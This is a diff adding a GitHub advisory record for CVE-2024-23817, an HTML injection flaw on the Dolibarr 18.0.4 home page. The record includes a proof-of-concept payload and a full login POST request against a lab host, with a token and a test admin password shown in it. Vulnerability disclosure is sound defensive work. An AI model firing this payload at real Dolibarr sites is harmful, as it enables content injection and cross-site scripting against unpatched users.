@@ -1,0 +1,52 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-7947-48q7-cp5m",
+  "modified": "2024-04-18T16:42:32Z",
+  "published": "2024-04-18T16:42:32Z",
+  "aliases": [
+    "CVE-2024-23817"
+  ],
+  "summary": "Dolibarr Application Home Page has HTML injection vulnerability",
+  "details": "### Summary\nObserved a HTML Injection vulnerbaility in the Home page of Dolibarr Application. This vulnerability allows an attacker to inject arbitrary HTML tags and manipulate the rendered content in the application's response. Specifically, I was able to successfully inject a new HTML tag into the returned document and, as a result, was able to comment out some part of the Dolibarr App Home page HTML code. This behavior can be exploited to perform various attacks like Cross-Site Scripting (XSS).\n\n### Details\n1. Navigate to the login page of Dolibarr application.\n2. Submit a login request with the following payload in an arbitrarily supplied body parameter: \"**u70ea%22%3e%3c!--HTML_Injection_By_Sai\"=1**\n\n**HTTP Post Request:**\nPOST /dolibarr/index.php?mainmenu=home HTTP/1.1\nHost: 192.168.37.129\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://192.168.37.129/dolibarr/index.php\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 375\nOrigin: http://192.168.37.129\nConnection: close\nCookie: <Redacted>\nUpgrade-Insecure-Requests: 1\n\ntoken=697c1f303ef1976a713eda01d20d8eab&actionlogin=login&loginfunction=loginfunction&backtopage=&tz=5.5&tz_string=Asia%2FKolkata&dst_observed=0&dst_first=&dst_second=&screenwidth=1280&screenheight=587&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=admin&password=manikanta&u70ea%22%3e%3c!--HTML_Injection_By_Sai=1\n\n3. Upon successful injection of the payload, some part of Home page HTML code was commented out.\n\n**POC**\nKindly go through the below video for detailed steps:\n\nhttps://user-images.githubusercontent.com/26869643/294010332-ff88d80b-cb26-4870-82d3-fb49f7ecc32f.mp4\n\n**Remediation Suggestion**\nKindly validate and sanitize all user-supplied input, especially within HTML attributes, to prevent HTML injection attacks.\nImplement proper output encoding when rendering user-provided data to ensure it is treated as plain text rather than executable HTML.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "dolibarr/dolibarr"
+      },
+      "versions": [
+        "18.0.4"
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Dolibarr/dolibarr/security/advisories/GHSA-7947-48q7-cp5m"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-23817"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Dolibarr/dolibarr"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79",
+      "CWE-80"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-04-18T16:42:32Z",
+    "nvd_published_at": "2024-01-25T20:15:41Z"
+  }
+}
